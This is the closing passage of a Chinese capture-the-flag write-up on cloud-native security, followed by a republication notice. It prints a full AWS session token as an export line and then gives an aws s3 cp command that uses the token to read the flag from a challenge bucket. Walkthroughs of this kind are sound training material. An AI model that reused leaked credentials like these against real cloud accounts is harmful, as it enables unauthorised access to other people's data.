export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLXdlc3QtMSJHMEUCIQCQXgdnO95QFsRGfNRwl6FRIVODhv7DGCCgf0/F9NEccgIgS84dEX0b8BpoDTBVg8pPmXmajzc5tZduOJy9MLmXnN8qwwQIPhAAGgw2ODg2NTUyNDY2ODEiDEjC4s706SV4TskmoyqgBESIoDtEtMpUWuKfwXAblQrwNCnyE61pREL6ercqUSWSEaUPln5t5rgqIkO/OMT6P5TpLTg9yoJeGPqhBr2nyxV1h6wYwrN6VZ/yng4UWuM1517DBIIUtzdnG0UeoLSCL6sy1sEUnw3piiXYN8Ci6Sg4i1FY6rOinx2O0E63FSWBFW1QVpHAnhUWqWZSSackUvJugC6LcEXbZUxX0DVwjOZt+YCSlcEFVj9PbXKOU8P0K0tQ1bUGP5vvphy09v26+VQmOrePLcdsp36k52Ggb6wZmwe9xqMhyPsEs6Lxw+E1hqWhxDyte1j1GsJrei2C2F0iubHbgrXzkghIkJ4vDdmhosLpYSlFzFm5a02zRyM9OFZKpFYSw4I7PXv8eV4YwdKmUfdpX3WLuaIhTg7NeZz80hh4P+Oyto4P8OE2UhfYYFODG4TFPYs387o2wUef8aCLJzG+lWm+A30bEBGznotaTk92Tdx25CA53ehreNwwtupD0pTJqLVs8rfGTW+y1kxv/YnrPQ1GtPUexuYu2qX3EKq/0mQ6vwI/lC7RfiZeVF6/8n2eJmsqifL1FGlZO289zYNTMyZqsmEN6LqKZjxxDYoJ8TGDSMtkNMfEcGB3CK0YKdIOC1IHByg/dQkYK4jZjI0S848j3Twb9WzK1grcfGPvJpmndDRYGzYVgSCLCc5d2wW8Ou3JCXsnlQKKWBWiFlyHtLad9eDXeaxRa38wjL/7qgY6lQE2yuNQ1qBb/iNNCKsUmgUaoT2iWOKmjf2ULw0rCqjr2fFHxLDAYStKoEIJh5caiNmhe7MrcOonzvr5TTWuaLHpwJLa7LinIF0DE14FvZkva/lXLikrskw1pn9Ntsc/RPMn7/M22kBKtbz5XuVJJXHt9x6cMqD+UVdNV1K0Ioro3aOwXM1lgxqlhzUiAEbWPLypuOr9qQ=="
```

即可得到 flag

```bash
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - 
```

----

本文发布已获得"云原生安全资讯"项目授权, 同步发布于以下平台

* github: [https://github.com/cloud-native-security-news/cloud-native-security-news](https://github.com/cloud-native-security-news/cloud-native-security-news)
* 公众号: 听雨安全
* 公众号: 石头的安全料理屋
* blog: [tari Blog](https://tari.moe)

欢迎加入 "云原生安全资讯"项目 👏 阅读、学习和总结云原生安全相关资讯
